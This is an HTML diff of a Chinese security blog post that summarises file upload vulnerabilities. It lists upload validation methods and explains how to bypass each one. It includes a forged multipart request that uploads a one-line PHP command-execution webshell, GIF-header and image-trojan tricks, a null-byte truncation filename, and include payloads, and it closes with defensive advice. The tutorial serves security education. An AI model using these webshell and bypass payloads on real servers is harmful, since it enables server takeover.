@@ -19,7 +19,7 @@
 <meta property="og:site_name" content="Pa55w0rd &#39;s Blog">
 <meta property="og:description" content="0x00 前言在web应用程序中，文件上传是一种常见的要求，因为它有助于提高业务效率。在大型社交网络程序中都支持文件上传功能。在博客，论坛，电子银行网络，会给用户和企业员工有效的共享文件。允许上传图片，视频，头像和许多其他类型文件。  上传文件的时候，如果服务器端脚本语言，未对上传的文件进行严格的验证和过滤，就有可能上传恶意的脚本文件，从而控制整个网站，甚至是服务器。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-11-21T11:29:36.631Z">
+<meta property="og:updated_time" content="2019-03-12T09:42:54.012Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="文件上传漏洞总结">
 <meta name="twitter:description" content="0x00 前言在web应用程序中，文件上传是一种常见的要求，因为它有助于提高业务效率。在大型社交网络程序中都支持文件上传功能。在博客，论坛，电子银行网络，会给用户和企业员工有效的共享文件。允许上传图片，视频，头像和许多其他类型文件。  上传文件的时候，如果服务器端脚本语言，未对上传的文件进行严格的验证和过滤，就有可能上传恶意的脚本文件，从而控制整个网站，甚至是服务器。">
@@ -257,10 +257,11 @@ ga('send', 'pageview');
 <p><strong>漏洞挖掘和利用</strong></p>
 <p>查找上传点，图片，头像，附件；目录，文件扫描发现类似upload,php等文件，编译器目录如ewebeditor,fckeditor,kingeditor等 </p>
 <h2 id="0x01-文件上传校验姿势"><a href="#0x01-文件上传校验姿势" class="headerlink" title="0x01 文件上传校验姿势"></a>0x01 文件上传校验姿势</h2><ul>
+<li>无任何过滤</li>
 <li>客户端javascript校验（一般只校验后缀名）</li>
 <li>服务端校验<ul>
 <li>文件头content-type字段校验（image/gif）</li>
-<li>文件内容头校验（GIF89a）</li>
+<li>文件内容校验（GIF89a）</li>
 <li>后缀名黑名单校验</li>
 <li>后缀名白名单校验</li>
 <li>自定义正则校验</li>
@@ -274,7 +275,8 @@ ga('send', 'pageview');
 <p>这里以PHP代码为例，模拟web服务器端的校验代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)  <span class="comment">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></span><br><span class="line">        &#123;   </span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">         <span class="keyword">exit</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    $uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">    $uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>],$uploadfile))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>
-<p><strong>1.2.2 文件内容头校验</strong></p>
+<p><strong>1.2.2 文件内容校验</strong></p>
+<p>针对文件头和文件内容检测通常有两种方式，白名单的方式是检测上传的文件中是否有白名单类型文件的文件头等内容特征信息，满足要求方能上传。黑名单是检测一些Webshell的特征，如果包含相关特征就不允许上传。</p>
 <p>可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：</p>
 <ul>
 <li>.JPEG;.JPE;.JPG，”JPGGraphic File”</li>
@@ -286,7 +288,7 @@ ga('send', 'pageview');
 <li>客户端绕过（抓包改包）</li>
 <li>服务端绕过<ul>
 <li>文件类型</li>
-<li>文件头</li>
+<li>文件内容</li>
 <li>文件后缀名</li>
 </ul>
 </li>
@@ -298,14 +300,15 @@ ga('send', 'pageview');
 <li>配合其他规则绕过</li>
 <li>WAF绕过</li>
 </ul>
-<h3 id="2-1-客户端绕过"><a href="#2-1-客户端绕过" class="headerlink" title="2.1 客户端绕过"></a>2.1 客户端绕过</h3><p>可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>
+<h3 id="2-1-客户端绕过"><a href="#2-1-客户端绕过" class="headerlink" title="2.1 客户端绕过"></a>2.1 客户端绕过</h3><p>由于JavaScript在客户端执行的特点，可以通过修改客户端代码或先上传符合要求的文件再在上传过程使用BURP等工具篡改文件等方式来绕过。如可以利用burp抓包改包，先上传一个jpg类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>
 <h3 id="2-2-服务端绕过"><a href="#2-2-服务端绕过" class="headerlink" title="2.2 服务端绕过"></a>2.2 服务端绕过</h3><p><strong>2.2.1 文件类型绕过</strong></p>
 <p>我们可以通过抓包，将content-type字段改为image/gif</p>
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="regexp">/upload.php HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">TE:</span> deflate,gzip;q=<span class="number">0.3</span></span><br><span class="line"><span class="string">Connection:</span> TE, close</span><br><span class="line"><span class="string">Host:</span> localhost</span><br><span class="line">User-<span class="string">Agent:</span> libwww-perl/<span class="number">5.803</span></span><br><span class="line">Content-<span class="string">Type:</span> multipart/form-data; boundary=xYzZY</span><br><span class="line">Content-<span class="string">Length:</span> <span class="number">155</span></span><br><span class="line">--xYzZY</span><br><span class="line">Content-<span class="string">Disposition:</span> form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.php"</span></span><br><span class="line">Content-<span class="string">Type:</span> image<span class="regexp">/gif (原为 Content-Type: text/</span>plain)</span><br><span class="line">&lt;?php system($_GET['command']);?&gt;</span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure>
-<p><strong>2.2.2 文件头绕过</strong></p>
+<p><strong>2.2.2 文件内容绕过</strong></p>
+<p>针对白名单检测，可以在满足要求的文件后插入木马脚本语句来绕过。而黑名单则可以通过对关键函数的各类混淆变化来绕过。</p>
 <p>在木马内容基础上再加了一些文件信息，有点像下面的结构</p>
 <p><code>GIF89a&lt;?php phpinfo(); ?&gt;</code></p>
-<p>或构造图片吗，将恶意文本写入图片的二进制代码，避免破坏图片文件头和尾</p>
+<p>或构造图片木马，将恶意文本写入图片的二进制代码，避免破坏图片文件头和尾</p>
 <p><code>copy xx.jpg/b + yy.txt/a xy.jpg</code></p>
 <ul>
 <li><p>/b 即二进制[binary]模式</p>
@@ -314,12 +317,12 @@ ga('send', 'pageview');
 </li>
 </ul>
 <p><strong>2.2.3 文件后缀名绕过</strong></p>
-<p>前提：黑名单校验</p>
 <p>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。</p>
 <p>绕过方法：</p>
 <ul>
 <li>找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类</li>
 <li>可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</li>
+<li>特殊字符结尾 - 比如后缀名后加一个空格和一个小数点绕过 php .</li>
 </ul>
 <p>能被解析的文件扩展名列表：</p>
 <ul>
@@ -328,6 +331,8 @@ ga('send', 'pageview');
 <li>php php php3 php4</li>
 <li>exe exee</li>
 </ul>
+<p>针对白名单绕过方式可以使用截断绕过、解析漏洞等进行绕过</p>
+<p>截断漏洞：在文件上传时进行抓包，webshell.jsp%00.jpg</p>
 <h3 id="2-3-配合文件包含漏洞"><a href="#2-3-配合文件包含漏洞" class="headerlink" title="2.3 配合文件包含漏洞"></a>2.3 配合文件包含漏洞</h3><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p>
 <p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p>
 <ul>
@@ -336,7 +341,8 @@ ga('send', 'pageview');
 </ul>
 <p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p>
 <figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">#PHP    </span></span><br><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(<span class="string">"上传的txt文件路径"</span>);<span class="meta">?&gt;</span></span> </span></span><br><span class="line"><span class="xml">#ASP    </span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--#include file="上传的txt文件路径" --&gt;</span></span></span><br><span class="line"><span class="xml">#JSP    </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">jsp:inclde</span> <span class="attr">page</span>=<span class="string">"上传的txt文件路径"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">or  </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@include file=<span class="string">"上传的txt文件路径"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br></pre></td></tr></table></figure>
-<h3 id="2-4-配合文件解析漏洞"><a href="#2-4-配合文件解析漏洞" class="headerlink" title="2.4 配合文件解析漏洞"></a>2.4 配合文件解析漏洞</h3><h3 id="2-5-配合操作系统文件命名规则"><a href="#2-5-配合操作系统文件命名规则" class="headerlink" title="2.5 配合操作系统文件命名规则"></a>2.5 配合操作系统文件命名规则</h3><ol>
+<h3 id="2-4-配合文件解析漏洞"><a href="#2-4-配合文件解析漏洞" class="headerlink" title="2.4 配合文件解析漏洞"></a>2.4 配合文件解析漏洞</h3><p>参考 <a href="http://www.pa55w0rd.club/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">《解析漏洞》</a></p>
+<h3 id="2-5-配合操作系统文件命名规则"><a href="#2-5-配合操作系统文件命名规则" class="headerlink" title="2.5 配合操作系统文件命名规则"></a>2.5 配合操作系统文件命名规则</h3><ol>
 <li><p>上传不符合windows文件命名规则的文件名</p>
 <ul>
 <li>test.asp.</li>
@@ -466,8 +472,8 @@ ga('send', 'pageview');
 <li>上传文件的存储目录禁用执行权限</li>
 <li>文件扩展名服务端白名单校验，注意0x00截断攻击 </li>
 <li>文件内容服务端校验。</li>
-<li>上传文件重命名。</li>
-<li>隐藏上传文件路径。</li>
+<li>上传文件重命名,使用随机性好的文件目录和文件名进行保存。</li>
+<li>隐藏上传文件路径,上传过程不应传递目录或文件路径，使用预先设置路径列表中的匹配索引值，严禁泄露文件绝对路径。。</li>
 </ul>
 <p>以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。 </p>
 <h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>php修复代码参考</p>
@@ -484,10 +490,11 @@ ga('send', 'pageview');
 <p><strong>漏洞挖掘和利用</strong></p>
 <p>查找上传点，图片，头像，附件；目录，文件扫描发现类似upload,php等文件，编译器目录如ewebeditor,fckeditor,kingeditor等 </p>
 <h2 id="0x01-文件上传校验姿势"><a href="#0x01-文件上传校验姿势" class="headerlink" title="0x01 文件上传校验姿势"></a>0x01 文件上传校验姿势</h2><ul>
+<li>无任何过滤</li>
 <li>客户端javascript校验（一般只校验后缀名）</li>
 <li>服务端校验<ul>
 <li>文件头content-type字段校验（image/gif）</li>
-<li>文件内容头校验（GIF89a）</li>
+<li>文件内容校验（GIF89a）</li>
 <li>后缀名黑名单校验</li>
 <li>后缀名白名单校验</li>
 <li>自定义正则校验</li>
@@ -501,7 +508,8 @@ ga('send', 'pageview');
 <p>这里以PHP代码为例，模拟web服务器端的校验代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)  <span class="comment">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></span><br><span class="line">        &#123;   </span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">         <span class="keyword">exit</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    $uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">    $uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>],$uploadfile))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>
-<p><strong>1.2.2 文件内容头校验</strong></p>
+<p><strong>1.2.2 文件内容校验</strong></p>
+<p>针对文件头和文件内容检测通常有两种方式，白名单的方式是检测上传的文件中是否有白名单类型文件的文件头等内容特征信息，满足要求方能上传。黑名单是检测一些Webshell的特征，如果包含相关特征就不允许上传。</p>
 <p>可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：</p>
 <ul>
 <li>.JPEG;.JPE;.JPG，”JPGGraphic File”</li>
@@ -513,7 +521,7 @@ ga('send', 'pageview');
 <li>客户端绕过（抓包改包）</li>
 <li>服务端绕过<ul>
 <li>文件类型</li>
-<li>文件头</li>
+<li>文件内容</li>
 <li>文件后缀名</li>
 </ul>
 </li>
@@ -525,14 +533,15 @@ ga('send', 'pageview');
 <li>配合其他规则绕过</li>
 <li>WAF绕过</li>
 </ul>
-<h3 id="2-1-客户端绕过"><a href="#2-1-客户端绕过" class="headerlink" title="2.1 客户端绕过"></a>2.1 客户端绕过</h3><p>可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>
+<h3 id="2-1-客户端绕过"><a href="#2-1-客户端绕过" class="headerlink" title="2.1 客户端绕过"></a>2.1 客户端绕过</h3><p>由于JavaScript在客户端执行的特点，可以通过修改客户端代码或先上传符合要求的文件再在上传过程使用BURP等工具篡改文件等方式来绕过。如可以利用burp抓包改包，先上传一个jpg类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>
 <h3 id="2-2-服务端绕过"><a href="#2-2-服务端绕过" class="headerlink" title="2.2 服务端绕过"></a>2.2 服务端绕过</h3><p><strong>2.2.1 文件类型绕过</strong></p>
 <p>我们可以通过抓包，将content-type字段改为image/gif</p>
 <figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="regexp">/upload.php HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">TE:</span> deflate,gzip;q=<span class="number">0.3</span></span><br><span class="line"><span class="string">Connection:</span> TE, close</span><br><span class="line"><span class="string">Host:</span> localhost</span><br><span class="line">User-<span class="string">Agent:</span> libwww-perl/<span class="number">5.803</span></span><br><span class="line">Content-<span class="string">Type:</span> multipart/form-data; boundary=xYzZY</span><br><span class="line">Content-<span class="string">Length:</span> <span class="number">155</span></span><br><span class="line">--xYzZY</span><br><span class="line">Content-<span class="string">Disposition:</span> form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.php"</span></span><br><span class="line">Content-<span class="string">Type:</span> image<span class="regexp">/gif (原为 Content-Type: text/</span>plain)</span><br><span class="line">&lt;?php system($_GET['command']);?&gt;</span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure>
-<p><strong>2.2.2 文件头绕过</strong></p>
+<p><strong>2.2.2 文件内容绕过</strong></p>
+<p>针对白名单检测，可以在满足要求的文件后插入木马脚本语句来绕过。而黑名单则可以通过对关键函数的各类混淆变化来绕过。</p>
 <p>在木马内容基础上再加了一些文件信息，有点像下面的结构</p>
 <p><code>GIF89a&lt;?php phpinfo(); ?&gt;</code></p>
-<p>或构造图片吗，将恶意文本写入图片的二进制代码，避免破坏图片文件头和尾</p>
+<p>或构造图片木马，将恶意文本写入图片的二进制代码，避免破坏图片文件头和尾</p>
 <p><code>copy xx.jpg/b + yy.txt/a xy.jpg</code></p>
 <ul>
 <li><p>/b 即二进制[binary]模式</p>
@@ -541,12 +550,12 @@ ga('send', 'pageview');
 </li>
 </ul>
 <p><strong>2.2.3 文件后缀名绕过</strong></p>
-<p>前提：黑名单校验</p>
 <p>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。</p>
 <p>绕过方法：</p>
 <ul>
 <li>找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类</li>
 <li>可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</li>
+<li>特殊字符结尾 - 比如后缀名后加一个空格和一个小数点绕过 php .</li>
 </ul>
 <p>能被解析的文件扩展名列表：</p>
 <ul>
@@ -555,6 +564,8 @@ ga('send', 'pageview');
 <li>php php php3 php4</li>
 <li>exe exee</li>
 </ul>
+<p>针对白名单绕过方式可以使用截断绕过、解析漏洞等进行绕过</p>
+<p>截断漏洞：在文件上传时进行抓包，webshell.jsp%00.jpg</p>
 <h3 id="2-3-配合文件包含漏洞"><a href="#2-3-配合文件包含漏洞" class="headerlink" title="2.3 配合文件包含漏洞"></a>2.3 配合文件包含漏洞</h3><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p>
 <p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p>
 <ul>
@@ -563,7 +574,8 @@ ga('send', 'pageview');
 </ul>
 <p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p>
 <figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">#PHP    </span></span><br><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(<span class="string">"上传的txt文件路径"</span>);<span class="meta">?&gt;</span></span> </span></span><br><span class="line"><span class="xml">#ASP    </span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--#include file="上传的txt文件路径" --&gt;</span></span></span><br><span class="line"><span class="xml">#JSP    </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">jsp:inclde</span> <span class="attr">page</span>=<span class="string">"上传的txt文件路径"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">or  </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@include file=<span class="string">"上传的txt文件路径"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br></pre></td></tr></table></figure>
-<h3 id="2-4-配合文件解析漏洞"><a href="#2-4-配合文件解析漏洞" class="headerlink" title="2.4 配合文件解析漏洞"></a>2.4 配合文件解析漏洞</h3><h3 id="2-5-配合操作系统文件命名规则"><a href="#2-5-配合操作系统文件命名规则" class="headerlink" title="2.5 配合操作系统文件命名规则"></a>2.5 配合操作系统文件命名规则</h3><ol>
+<h3 id="2-4-配合文件解析漏洞"><a href="#2-4-配合文件解析漏洞" class="headerlink" title="2.4 配合文件解析漏洞"></a>2.4 配合文件解析漏洞</h3><p>参考 <a href="http://www.pa55w0rd.club/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">《解析漏洞》</a></p>
+<h3 id="2-5-配合操作系统文件命名规则"><a href="#2-5-配合操作系统文件命名规则" class="headerlink" title="2.5 配合操作系统文件命名规则"></a>2.5 配合操作系统文件命名规则</h3><ol>
 <li><p>上传不符合windows文件命名规则的文件名</p>
 <ul>
 <li>test.asp.</li>
@@ -693,8 +705,8 @@ ga('send', 'pageview');
 <li>上传文件的存储目录禁用执行权限</li>
 <li>文件扩展名服务端白名单校验，注意0x00截断攻击 </li>
 <li>文件内容服务端校验。</li>
-<li>上传文件重命名。</li>
-<li>隐藏上传文件路径。</li>
+<li>上传文件重命名,使用随机性好的文件目录和文件名进行保存。</li>
+<li>隐藏上传文件路径,上传过程不应传递目录或文件路径，使用预先设置路径列表中的匹配索引值，严禁泄露文件绝对路径。。</li>
 </ul>
 <p>以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。 </p>
 <h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>php修复代码参考</p>
@@ -710,7 +722,7 @@ ga('send', 'pageview');
 
     <footer class="article-footer">
       
-        <a data-url="http://www.pa55w0rd.club/fileupload/" data-id="cjsu02y9x006k91t66jd0ua46" class="article-share-link" data-share="baidu" data-title="文件上传漏洞总结">分享到</a>
+        <a data-url="http://www.pa55w0rd.club/fileupload/" data-id="cjtjx2wn8006k6kt6lg45zwe0" class="article-share-link" data-share="baidu" data-title="文件上传漏洞总结">分享到</a>
       
 
       
@@ -727,17 +739,17 @@ ga('send', 'pageview');
     
 <nav id="article-nav">
   
-    <a href="/quick-SQL-cheatsheet/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/trs/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">← 上一篇</strong>
-      <div class="article-nav-title">SQL 速查表</div>
+      <div class="article-nav-title">TRS漏洞整理 （转发）</div>
     </a>
   
   
-    <a href="/代码自动化扫描系统建设/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/quick-SQL-cheatsheet/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">下一篇 →</strong>
       <div class="article-nav-title">
         
-          代码自动化扫描系统的建设（转发）
+          SQL 速查表
         
       </div>
     </a>
@@ -779,6 +791,14 @@ ga('send', 'pageview');
       <ul>
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/kunpeng/">开源POC检测框架Kunpeng使用</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
+            <a id="recentpost_item" href="/vmware/">VMware Workstation pro 激活密钥</a>
+          </li>
+        
+          <li onclick="javascript:document.getElementById('recentpost_item').click();">
             <a id="recentpost_item" href="/mysql-forget-passwd/">CentOS7下mysql5.7忘记root密码</a>
           </li>
         
@@ -788,14 +808,6 @@ ga('send', 'pageview');
         
           <li onclick="javascript:document.getElementById('recentpost_item').click();">
             <a id="recentpost_item" href="/sonar/">Docker部署sonar</a>
-          </li>
-        
-          <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/docker1/">修改正在运行的docker容器的端口映射</a>
-          </li>
-        
-          <li onclick="javascript:document.getElementById('recentpost_item').click();">
-            <a id="recentpost_item" href="/insight/">insight洞察-漏洞生命周期管理使用</a>
           </li>
         
       </ul>
@@ -808,7 +820,7 @@ ga('send', 'pageview');
   <div class="widget-wrap">
     <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-tasks"></i>分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/note/">note</a><span class="category-list-count">27</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全建设/">安全建设</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/应急响应/">应急响应</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发安全/">开发安全</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a><span class="category-list-count">3</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/note/">note</a><span class="category-list-count">28</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web安全/">web安全</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/安全建设/">安全建设</a><span class="category-list-count">13</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/应急响应/">应急响应</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/开发安全/">开发安全</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/移动安全/">移动安全</a><span class="category-list-count">3</span></li></ul>
     </div>
   </div>
 
@@ -824,7 +836,7 @@ ga('send', 'pageview');
   <div class="widget-wrap">
     <h3 class="widget-title" data-scroll-reveal="enter top and over 0.7s"><i class="fa fa-cloud"></i>标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/Android/" style="font-size: 11.67px;">Android</a> <a href="/tags/Android-安全测试-工具使用/" style="font-size: 10px;">Android - 安全测试 - 工具使用</a> <a href="/tags/HTTPS/" style="font-size: 10px;">HTTPS</a> <a href="/tags/PHPstudy/" style="font-size: 10px;">PHPstudy</a> <a href="/tags/TRS/" style="font-size: 10px;">TRS</a> <a href="/tags/algolia/" style="font-size: 10px;">algolia</a> <a href="/tags/checklist/" style="font-size: 11.67px;">checklist</a> <a href="/tags/docker/" style="font-size: 11.67px;">docker</a> <a href="/tags/hexo/" style="font-size: 13.33px;">hexo</a> <a href="/tags/iso27001/" style="font-size: 10px;">iso27001</a> <a href="/tags/jsonp劫持/" style="font-size: 10px;">jsonp劫持</a> <a href="/tags/linux/" style="font-size: 11.67px;">linux</a> <a href="/tags/mongodb/" style="font-size: 10px;">mongodb</a> <a href="/tags/sql/" style="font-size: 10px;">sql</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/web安全/" style="font-size: 15px;">web安全</a> <a href="/tags/windows-审计工具/" style="font-size: 10px;">windows 审计工具</a> <a href="/tags/xunfeng/" style="font-size: 10px;">xunfeng</a> <a href="/tags/业务安全/" style="font-size: 10px;">业务安全</a> <a href="/tags/代码扫描/" style="font-size: 10px;">代码扫描</a> <a href="/tags/信息收集/" style="font-size: 10px;">信息收集</a> <a href="/tags/内网安全/" style="font-size: 10px;">内网安全</a> <a href="/tags/内网渗透/" style="font-size: 10px;">内网渗透</a> <a href="/tags/前端加密/" style="font-size: 10px;">前端加密</a> <a href="/tags/名词解释/" style="font-size: 10px;">名词解释</a> <a href="/tags/基础/" style="font-size: 10px;">基础</a> <a href="/tags/基础知识/" style="font-size: 15px;">基础知识</a> <a href="/tags/基线加固/" style="font-size: 10px;">基线加固</a> <a href="/tags/备忘录/" style="font-size: 10px;">备忘录</a> <a href="/tags/安全建设/" style="font-size: 18.33px;">安全建设</a> <a href="/tags/安全架构/" style="font-size: 10px;">安全架构</a> <a href="/tags/安全规划/" style="font-size: 10px;">安全规划</a> <a href="/tags/安全规范/" style="font-size: 13.33px;">安全规范</a> <a href="/tags/安全设计/" style="font-size: 16.67px;">安全设计</a> <a href="/tags/安全设计评审/" style="font-size: 10px;">安全设计评审</a> <a href="/tags/安全评估/" style="font-size: 10px;">安全评估</a> <a href="/tags/安全运维/" style="font-size: 10px;">安全运维</a> <a href="/tags/安装使用/" style="font-size: 11.67px;">安装使用</a> <a href="/tags/工具使用/" style="font-size: 16.67px;">工具使用</a> <a href="/tags/平台建设/" style="font-size: 11.67px;">平台建设</a> <a href="/tags/应急响应/" style="font-size: 11.67px;">应急响应</a> <a href="/tags/开发安全/" style="font-size: 15px;">开发安全</a> <a href="/tags/开源工具/" style="font-size: 10px;">开源工具</a> <a href="/tags/技巧/" style="font-size: 11.67px;">技巧</a> <a href="/tags/指南/" style="font-size: 10px;">指南</a> <a href="/tags/操作记录/" style="font-size: 10px;">操作记录</a> <a href="/tags/数据安全/" style="font-size: 10px;">数据安全</a> <a href="/tags/数据库/" style="font-size: 10px;">数据库</a> <a href="/tags/渗透测试/" style="font-size: 10px;">渗透测试</a> <a href="/tags/漏洞利用/" style="font-size: 16.67px;">漏洞利用</a> <a href="/tags/漏洞管理/" style="font-size: 10px;">漏洞管理</a> <a href="/tags/移动安全/" style="font-size: 10px;">移动安全</a> <a href="/tags/等级保护/" style="font-size: 10px;">等级保护</a> <a 